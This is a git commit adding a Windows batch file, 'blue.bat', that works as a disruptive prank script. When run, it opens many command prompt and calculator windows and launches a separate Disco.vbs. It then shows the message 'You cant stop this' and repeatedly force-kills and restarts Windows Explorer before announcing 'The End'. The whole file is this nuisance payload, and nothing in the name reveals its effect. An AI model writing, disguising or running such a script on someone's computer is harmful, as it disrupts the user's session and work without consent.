853d8c9874536680e4eee7cabfecd7c44b0597b1
Invi <87852132+Invincible23411@users.noreply.github.com>
2021-08-30 18:41:56 +0800

    Add files via upload

---
+++ blue.bat
@@ -0,0 +1,112 @@
+@echo off
+start cmd.exe
+start Disco.vbs
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start calc.exe
+start calc.exe
+start calc.exe
+Timeout 5
+msg * "You cant stop this"
+Timeout 4
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+taskkill /f /im explorer.exe
+start explorer.exe
+Timeout 1
+msg * "The End"
